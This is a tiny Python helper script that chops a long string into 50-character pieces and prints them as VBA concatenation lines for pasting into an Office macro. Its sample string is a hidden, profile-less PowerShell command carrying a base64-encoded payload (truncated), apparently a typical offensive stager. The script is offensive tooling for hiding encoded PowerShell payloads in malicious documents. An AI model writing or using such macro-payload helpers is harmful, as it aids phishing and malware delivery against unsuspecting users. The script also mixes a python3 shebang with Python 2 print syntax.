#!/usr/bin/python3
```If using VBA, use this script to break a string into correct size```

str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB..."

n = 50

for i in range(0, len(str), n):
  print "Str = Str + " + '"' + str[i:i+n] + '"'
